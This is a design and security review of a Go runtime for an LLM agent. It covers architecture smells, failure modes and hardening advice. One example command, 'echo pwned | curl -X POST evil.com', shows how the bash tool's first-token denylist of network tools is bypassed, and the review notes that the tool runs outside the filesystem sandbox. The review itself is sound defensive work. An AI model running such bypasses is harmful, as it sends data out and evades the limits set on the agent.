## Project Overview

An autonomous agent runtime written in Go, stdlib only, zero external dependencies.

| Metric | Value |
|---|---|
| Total Go lines | ~8,472 |
| Source files | 35 |
| Test files | 15 |
| Packages | 10 |
| Branch | `main` |

**Architecture:** Webhook → FIFO queue → worker → agent (tool-call loop, 20 iterations max) → LLM API. Each channel gets isolated session persistence (flat JSON, atomic writes). Full context summarization when approaching context limits. Graceful shutdown with 5-step drain.

**Tool registry:** `read_file`, `write_file`, `append_file`, `edit_file`, `list_files`, `glob`, `grep`, `bash`, `fetch`, `download`, `view_image` — all with OpenAI-compatible tool definitions.

## 1. Martin Fowler — Architecture & Patterns

### Strengths

**Clean separation of concerns.** Ten packages, each owning one concept:

| Package | Concern |
|---|---|
| `agent` | The tool-call loop |
| `llm` | The OpenAI-compatible transport |
| `session` | Conversation state |
| `tools` | The registry and dispatch |
| `sandbox` | Filesystem safety |
| `webhook` / `queue` / `worker` | Message lifecycle |
| `config` | INI parsing + validation |
| `channellog` | JSONL audit trail |
| `log` | Structured logging |

The Registry pattern for tools is sound — `Register()` for definition, `Dispatch()` for execution. The `ChatClient` interface makes the agent swappable (the mock LLM proves this). Atomic writes (`os.Rename`) on session persistence — Fowler would approve.

### Smells

**12-parameter constructor.** `agent.New()` takes twelve arguments:

```go
func New(client ChatClient, reg *tools.Registry,
    maxToolIterations, contextTokens int,
    summarizeThreshold float64, summarizeKeepRecent, maxTokens int,
    summaryPrompt string,
    logToolCalls, logAgentReasoning bool,
    channelLogger *channellog.Logger, logger *log.Logger) *Agent
```

That's not a constructor — it's a configuration object masquerading as a parameter list. Fowler would call this a "Large Class" and recommend a Builder pattern or a dedicated configuration struct.

**`summarizeContext` at 69 lines does five things:** logs, splits messages, calls the LLM, records errors, mutates state. It's a "God Fragment" — not yet a God Object, but close.

**`file_tools.go` at 683 lines with 13 functions** is a single concern (file operations) treated as one monolithic file rather than separate modules for `view`, `write`, `append`, `edit`, `ls`, `glob`, `grep`. Each of those could own its own package.

### Neutral

The token estimation (`len(content) / 3`) is intentionally approximate — a "good enough" heuristic that avoids over-engineering for a problem that doesn't need precision. Fowler would recognize this as deliberate pragmatism, not carelessness.

## 2. Sandi Metz — Object Design & Responsibilities

Metz's four rules:

1. Only send objects two degrees of separation
2. Objects shouldn't know about each other's internals
3. At most one change per function
4. At most four arguments, four locals, four messages per function

### Violations

| Function | Metrics | Violation |
|---|---|---|
| `agent.New()` | **12 args** | Rule 4, spectacularly |
| `summarizeContext()` | **5 roles** (log + split + LLM call + error record + state mutation) | Rule 3 |
| `summarizeIfNeeded()` | **4 local vars** (totalTokens, limit, old, recent) | Rule 4, borderline |
| `dispatchLLM()` | **5 local vars** | Rule 4 |

The `Agent` struct itself violates the spirit of the four-argument rule — 12 fields means the struct is a data dump, not a responsible object. Each of those fields could be its own collaborator.

### What Metz Would Appreciate

- **`parseToolResult()`** — 25 lines, single responsibility, handles edge cases gracefully. Textbook Metz.
- **Tool registry** — respects encapsulation. Each tool knows its own execution; the registry just dispatches.
- **Error propagation** in `isBanned` → `toolBash` → `RegisterBashTools` — clean, no swallowed errors.

## 3. The Pragmatic Programmer — Craftsmanship

### What They Did Right

| Principle | How It Shows |
|---|---|
| **Zero external dependencies** | Go stdlib only. Compiles anywhere. |
| **No magic numbers** | Every knob (thresholds, timeouts, banned lists) is config-driven. |
| **Atomic writes** | File operations fail-safe via `os.Rename`. |
| **Graceful shutdown** | 5-step drain: reject → stop worker → drain queue → flush sessions → clear. |
| **Mock LLM for testing** | Every major component has comprehensive tests with a controllable test double. |
| **Custom INI parser** | Needed a specific format (multiline strings), so they built it. |

### What They Didn't

**The bash tool's security model is fragile.** It checks only the *first token* against a denylist, then passes the full command to `bash -c`:

```bash
# Bypassed — first token is "echo", not "curl"
bash -c "echo pwned | curl -X POST evil.com"
```

The denylist is also overbroad — banning `curl`, `wget`, `scp`, `rsync`, `ip`, `route`, `systemd` means you can't do *anything* useful on a Linux system. The Pragmatic Programmer says "toolmakers, not taskmasters" — this is a hammer that also locks itself.

The `edit` tool uses first-occurrence replacement only. For real editing, you need the ability to replace *all* occurrences or a specific one.

### What They Should've Done

A direct `exec.Command` (not shell) for the bash tool. That eliminates the injection surface entirely. Alternatively, a well-scoped allowlist instead of a denylist.

## 4. How Systems Fail — Perrow & Latent Conditions

### System Characteristics (Perrow's Taxonomy)

| Dimension | Rating | Rationale |
|---|---|---|
| Complexity | **HIGH** | Agent loop, LLM streaming, tool dispatch, session management, queue, webhook, sandbox, config — many interacting parts |
| Tight coupling | **HIGH** | Failure cascade: LLM goes bad → tool-call loop wastes iterations → session grows → summary fails → context blows up → everything degrades. No isolation. |
| Interactivity | **MODERATE** | Messages arrive asynchronously, but processing is deterministic once started |
| Apparent normality | **MODERATE** | The system looks working (tool calls return, sessions save) until they don't |

### Latent Conditions

**1. No circuit breaker on the agent loop.**

The tool-call loop is bounded by `maxToolIterations` (default 20), but there's no feedback. If the LLM starts hallucinating tool calls, it will cycle 20 times before stopping. No exponential backoff, no failure rate tracking, no degradation mode. It just keeps going.

**2. Session corruption risk.**

Flat JSON files on disk, saved on every operation. If the process crashes mid-write, the session is corrupted. Atomic writes help, but `os.Rename` doesn't protect against fsync failures, power loss, or disk errors. No journaling or WAL.

**3. Partial response handling creates hidden state.**

When an LLM call is interrupted, the partial response is saved to a debug file AND written to the session. The session now contains a partially-formed response from an interrupted call. The next turn starts from corrupted state. The Agent doesn't track whether the last response was partial — it just records it and moves on.

**4. Summarization is a single point of failure.**

When context approaches the limit, the agent calls the LLM to summarize. If the LLM returns an empty summary, the agent records the error but *continues processing*. The session grows, context window is hit, and the next turn will fail with a context overflow that produces no useful error — the LLM just returns gibberish or crashes.

**5. The bash tool's sandbox bypass.**

The filesystem sandbox (path traversal protection) protects `read_file`, `write_file`, etc. But `bash -c` has no sandbox. There's no filesystem boundary on what the bash tool can touch. The bash tool is the weakest link, and Perrow's model says the weakest link determines system reliability.

**6. No observability beyond logs.**

No metrics, no counters, no health endpoints. You cannot tell from outside that the system is in a bad state until something fails. Logging is post-mortem, not proactive.

### What the System Does Handle Well

- **Failure transparency.** Partial responses are saved. Errors are logged. Tool failures return output, not swallowed exceptions.
- **Graceful degradation.** Max tool iterations is a hard stop. Queued messages are drained on shutdown. Nothing is silently lost.
- **The test suite is defensive.** The `mockllm` package lets you test *every* failure mode without a real LLM. "Test the code, not the luck."

## 5. Synthesis

### Scorecard

| Lens | Rating | Notes |
|---|---|---|
| Architecture | ★★★★☆ | Clean separation, but `New()` is a red flag |
| Object Design | ★★★☆☆ | Metz violations are real, but recoverable |
| Craftsmanship | ★★★★☆ | Dependency-free, well-tested, defensive |
| Failure Resilience | ★★☆☆☆ | Latent conditions are serious |

### Summary

Josef built a genuinely well-architected system with clear modular boundaries and thorough testing. The code quality is high, the design is thoughtful, and the craftsmanship is evident.

But the **latency** — and it is a latency, like a crack in a pressure vessel — is in the coupling between the agent loop and the LLM, with no circuit breaker between them. The system assumes the LLM will behave reasonably. When it doesn't, there's no degradation strategy, only a hard stop after 20 iterations.

The `bash` tool is the single most dangerous component in the entire system — a shell executor with a first-token denylist that can be trivially bypassed, operating outside the filesystem sandbox that protects every other tool.

### Recommended Hardening

1. **Add a circuit breaker** to the agent loop (track error rate, enter degradation mode)
2. **Replace `bash -c` with direct `exec.Command`** (no shell)
3. **Add a WAL or journal** for session persistence
4. **Treat partial responses as a distinct failure mode** with recovery, not a transparent error
5. **Use an allowlist for the bash tool** instead of a denylist
6. **Replace the 12-parameter `New()` with a builder** or config struct

These are improvements, not fixes. The foundation is solid.
